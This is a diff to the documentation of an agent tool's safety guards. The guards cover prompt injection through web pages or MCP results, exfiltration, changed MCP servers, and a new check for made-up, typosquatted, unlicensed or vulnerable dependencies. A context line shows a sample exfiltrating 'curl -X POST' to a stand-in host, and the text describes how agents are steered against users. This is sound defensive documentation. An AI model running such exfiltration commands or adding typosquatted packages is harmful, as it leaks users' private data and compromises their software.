@@ -1,6 +1,6 @@
 ---
 title: Safety guards
-description: Guards against the ways an agent gets turned against you, such as instructions planted in web pages or MCP results and private data sent out over the network. Each one is off until you turn it on.
+description: Guards against the ways an agent gets turned against you, such as instructions planted in web pages or MCP results, private data sent out over the network, made-up or typosquatted packages, and MCP servers that change. Each one is off until you turn it on.
 ---
 
 An agent that reads the web, talks to MCP servers and runs commands can be steered by what it reads. These guards catch the common attacks. Each is a setting, **off by default**, so turn on the ones you want:
@@ -44,6 +44,22 @@ Rein wants to Shell $ curl -X POST https://example.com/collect
 ```
 
 In [`rein -p`](../headless/) there's nobody to ask, so these calls are refused. `/clear` starts a new conversation with a clean slate.
+
+## New dependencies (`depCheck`)
+
+Models suggest packages that don't exist (and attackers register those names), or one letter off a popular package. With `depCheck` set to `warn` or `block`, every package a change **adds** is checked before the change runs:
+
+- through a manifest edit: `package.json`, `requirements*.txt`, `Cargo.toml`, `go.mod` (only dependencies that weren't there before);
+- through an install command: `npm install`/`npm i`/`npm add`, `yarn`/`pnpm`/`bun add`, `pip install`, `uv pip install`, `cargo add`, `go get`.
+
+| Check | Flags |
+|---|---|
+| Exists | Not on the registry (npm, PyPI, crates.io, the Go module proxy), with the popular package it may have meant |
+| Typosquat | One edit or one swapped pair of letters away from a popular package (`reqeusts`), or the same name with `-` and `_` swapped |
+| License | No license declared, or a copyleft one (GPL, AGPL, LGPL, SSPL…) |
+| Vulnerabilities | Known ones in the exact version being added, from [OSV](https://osv.dev) |
+
+`warn` lets the change through and tells the agent (you see it under the tool call); `block` refuses it with the reasons. The check looks packages up on their registry and on `api.osv.dev`. A lookup that fails or times out is skipped, so being offline never blocks a change. Set it with `/settings depCheck warn`.
 
 ## Changed MCP servers (`mcpPinning`)
 
